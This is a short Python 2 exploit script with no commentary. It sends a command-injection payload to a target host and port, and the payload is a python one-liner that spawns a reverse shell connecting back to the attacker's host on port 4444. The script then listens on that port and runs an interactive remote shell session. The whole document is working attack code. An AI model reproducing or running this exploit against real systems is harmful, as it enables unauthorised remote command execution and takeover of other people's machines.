from socket import *
import sys


thost, tport = sys.argv[1], int(sys.argv[2])
lhost = '"'+ sys.argv[3] +'"'




fir = socket(AF_INET,SOCK_STREAM)


fir.connect((thost,tport))
payload = """AB;python -c 'import socket,subprocess,os;pay=socket.socket(socket.AF_INET,socket.SOCK_STREAM);pay.connect((""" + lhost + """,4444));os.dup2(pay.fileno(),0); os.dup2(pay.fileno(),1); os.dup2(pay.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
fir.send(payload)
fir.recv(1024)




han = socket(AF_INET,SOCK_STREAM)


han.bind(("",4444))
han.listen(1)
fir.close()
cl = han.accept()
print cl.recv(1024)
while True:
    sh = cl.recv(1024)
    send = raw_input(sh)
    if send == "exit":
        han.close()
        exit()
    cl.send(send + "\n")
    data = cl.recv(1024)
    print data
